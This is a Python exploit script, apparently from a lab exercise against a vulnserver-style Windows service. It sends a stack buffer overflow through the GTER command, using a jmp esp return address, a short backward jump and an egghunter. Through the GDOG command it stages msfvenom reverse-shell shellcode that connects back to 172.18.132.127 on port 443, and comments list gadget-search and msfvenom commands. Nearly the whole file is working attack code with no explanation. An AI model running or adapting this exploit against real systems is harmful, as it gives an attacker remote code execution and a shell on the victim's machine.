import socket, time, sys, struct
from struct import pack
from ExploitFramework import *

"""
.load narly; !nmod
struct.pack("<I", (EIP))
python3 gadgets.py --syntax 2 -f /home/kali/Desktop/Reverse/msvcrt.dll /home/kali/Desktop/Reverse/QuoteDB.exe -s 'pop ecx'
python3 gadgets.py --syntax 2 -f /home/kali/Desktop/Reverse/msvcrt.dll /home/kali/Desktop/Reverse/QuoteDB.exe -s 'mov esi' -c 10
python3 gadgets.py --syntax 2 -f /home/kali/Desktop/Reverse/msvcrt.dll /home/kali/Desktop/Reverse/QuoteDB.exe -r -a
getMsfVenomShellcode('172.18.132.127', '443', badchars=bc.getBadChars())
msf-nasm_shell
"""

##############################################
# PARAMS
##############################################
ip = "172.18.132.3"
port = 9999
buf = b""
timeout = 1
offset = 151
fuzz_limit = 50000
fuzz_step = 100
bc = BadChars(b"\x00\x0a\x0d")
fuzz_pattern = b"AABCDCACD"
# s -a 0 L?80000000 "AABCDCACD"
# s -a 0 L?80000000 "w00tw00t"
##############################################

# msfvenom -p windows/shell_reverse_tcp LHOST=172.18.132.127 LPORT=443 EXITFUNC=thread -e x86/shikata_ga_nai -b '\x00\x00\x0a\x0d' -f python -v shellcode
shellcode =  b"\x90"*16
shellcode += b"\xd9\xc1\xbd\x7a\xb8\xa1\xaa\xd9\x74\x24\xf4"
shellcode += b"\x5b\x2b\xc9\xb1\x52\x31\x6b\x17\x83\xc3\x04"
shellcode += b"\x03\x11\xab\x43\x5f\x19\x23\x01\xa0\xe1\xb4"
shellcode += b"\x66\x28\x04\x85\xa6\x4e\x4d\xb6\x16\x04\x03"
shellcode += b"\x3b\xdc\x48\xb7\xc8\x90\x44\xb8\x79\x1e\xb3"
shellcode += b"\xf7\x7a\x33\x87\x96\xf8\x4e\xd4\x78\xc0\x80"
shellcode += b"\x29\x79\x05\xfc\xc0\x2b\xde\x8a\x77\xdb\x6b"
shellcode += b"\xc6\x4b\x50\x27\xc6\xcb\x85\xf0\xe9\xfa\x18"
shellcode += b"\x8a\xb3\xdc\x9b\x5f\xc8\x54\x83\xbc\xf5\x2f"
shellcode += b"\x38\x76\x81\xb1\xe8\x46\x6a\x1d\xd5\x66\x99"
shellcode += b"\x5f\x12\x40\x42\x2a\x6a\xb2\xff\x2d\xa9\xc8"
shellcode += b"\xdb\xb8\x29\x6a\xaf\x1b\x95\x8a\x7c\xfd\x5e"
shellcode += b"\x80\xc9\x89\x38\x85\xcc\x5e\x33\xb1\x45\x61"
shellcode += b"\x93\x33\x1d\x46\x37\x1f\xc5\xe7\x6e\xc5\xa8"
shellcode += b"\x18\x70\xa6\x15\xbd\xfb\x4b\x41\xcc\xa6\x03"
shellcode += b"\xa6\xfd\x58\xd4\xa0\x76\x2b\xe6\x6f\x2d\xa3"
shellcode += b"\x4a\xe7\xeb\x34\xac\xd2\x4c\xaa\x53\xdd\xac"
shellcode += b"\xe3\x97\x89\xfc\x9b\x3e\xb2\x96\x5b\xbe\x67"
shellcode += b"\x38\x0b\x10\xd8\xf9\xfb\xd0\x88\x91\x11\xdf"
shellcode += b"\xf7\x82\x1a\x35\x90\x29\xe1\xde\x33\xbf\x6d"
shellcode += b"\x61\x24\xc2\x6d\x9f\x0f\x4b\x8b\xf5\x7f\x1a"
shellcode += b"\x04\x62\x19\x07\xde\x13\xe6\x9d\x9b\x14\x6c"
shellcode += b"\x12\x5c\xda\x85\x5f\x4e\x8b\x65\x2a\x2c\x1a"
shellcode += b"\x79\x80\x58\xc0\xe8\x4f\x98\x8f\x10\xd8\xcf"
shellcode += b"\xd8\xe7\x11\x85\xf4\x5e\x88\xbb\x04\x06\xf3"
shellcode += b"\x7f\xd3\xfb\xfa\x7e\x96\x40\xd9\x90\x6e\x48"
shellcode += b"\x65\xc4\x3e\x1f\x33\xb2\xf8\xc9\xf5\x6c\x53"
shellcode += b"\xa5\x5f\xf8\x22\x85\x5f\x7e\x2b\xc0\x29\x9e"
shellcode += b"\x9a\xbd\x6f\xa1\x13\x2a\x78\xda\x49\xca\x87"
shellcode += b"\x31\xca\xea\x65\x93\x27\x83\x33\x76\x8a\xce"
shellcode += b"\xc3\xad\xc9\xf6\x47\x47\xb2\x0c\x57\x22\xb7"
shellcode += b"\x49\xdf\xdf\xc5\xc2\x8a\xdf\x7a\xe2\x9e"

# store pattern in GDOG
buf += b"GDOG "
buf += b"w00tw00t"
buf += shellcode
buf2 = buf
buf = b""

code = b""
code = b"A" * 0x1f # shift
code += b"\x83\xEC\x7C"    # sub esp, 0x7E
code += b"\x90"*8
code += getEggHunterShellcodeSEH()

# exploit BoF
buf += b"GTER "
buf += code
buf += b"A" * (offset-len(code))
buf += pack("<L", 0x625011bb)   # jmp esp;
# jump 9a up
buf += b"\xEB\x80"
buf += b"\x90\x90"
buf += b"C" * 100

s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s2.connect((ip, port))
s2.send(buf2)
print(f"{GOOD} {len(buf2)} Shellcode sended")



##############################################
# SEND EXPLOIT
##############################################
checkForBadChars(buf, bc.getBadChars())
checkForBadChars(buf2, bc.getBadChars())
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
connect = s.connect((ip, port))
print(s.recv(1024))
s.send(buf)
print(f"{GOOD} {len(buf)} bytes sent")
s.close()
s2.close()